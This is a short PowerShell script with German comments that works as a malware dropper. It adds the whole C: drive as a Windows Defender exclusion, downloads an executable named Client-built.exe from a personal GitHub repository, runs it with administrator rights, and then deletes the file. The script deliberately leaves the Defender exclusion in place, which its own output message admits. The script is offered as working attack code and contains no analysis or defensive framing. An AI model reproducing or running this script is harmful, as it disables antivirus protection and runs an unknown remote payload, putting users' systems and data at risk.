# Setze den Pfad der gesamten C:-Partition
$DrivePath = "C:\"

# URL der Datei, die von GitHub heruntergeladen werden soll
$GitHubURL = "https://raw.githubusercontent.com/IchbinMrNook/Private_script_pull/main/Client-built.exe"
$DownloadedFile = Join-Path "$env:USERPROFILE\Downloads" "Client-built.exe"

# 1. Überprüfen, ob Windows Defender läuft
$defenderService = Get-Service -Name windefend -ErrorAction SilentlyContinue
if ($defenderService.Status -ne 'Running') {
    Write-Host "Starte Windows Defender-Dienst..." -ForegroundColor Yellow
    Start-Service -Name windefend
    Start-Sleep -Seconds 3  # Warte ein paar Sekunden, um sicherzustellen, dass der Dienst gestartet ist
} else {
    Write-Host "Windows Defender-Dienst läuft bereits." -ForegroundColor Green
}

# 2. C:-Partition als Ausnahme hinzufügen
Write-Host "Füge $DrivePath als Ausnahme in Windows Defender hinzu..." -ForegroundColor Green
Add-MpPreference -ExclusionPath $DrivePath

# 3. Datei von GitHub herunterladen
Write-Host "Lade Datei von GitHub herunter..." -ForegroundColor Green
Invoke-WebRequest -Uri $GitHubURL -OutFile $DownloadedFile

# Überprüfen, ob die Datei heruntergeladen wurde
if (Test-Path $DownloadedFile) {
    Write-Host "Datei erfolgreich heruntergeladen: $DownloadedFile" -ForegroundColor Green
    
    # 4. Datei als Administrator ausführen
    Write-Host "Führe Datei als Administrator aus..." -ForegroundColor Green
    Start-Process -FilePath $DownloadedFile -Verb RunAs

    # 5. 5 Sekunden warten
    Start-Sleep -Seconds 5

    # 6. Datei löschen
    Write-Host "Lösche heruntergeladene Datei..." -ForegroundColor Green
    Remove-Item -Path $DownloadedFile -Force

    # 7. Ausnahme für C:-Partition entfernen
    Write-Host "Entferne Ausnahme für $DrivePath NICHT..." -ForegroundColor Green

    Write-Host "Skript abgeschlossen." -ForegroundColor Green
} else {
    Write-Host "Fehler: Datei konnte nicht heruntergeladen werden!" -ForegroundColor Red
}
